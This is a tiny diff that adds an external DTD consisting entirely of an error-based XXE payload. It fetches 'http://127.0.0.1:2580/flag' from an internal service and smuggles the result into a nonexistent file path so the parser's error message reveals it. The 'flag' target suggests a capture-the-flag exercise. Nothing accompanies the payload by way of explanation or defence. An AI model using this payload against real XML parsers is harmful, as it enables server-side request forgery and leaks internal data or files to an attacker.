@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "http://127.0.0.1:2580/flag">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
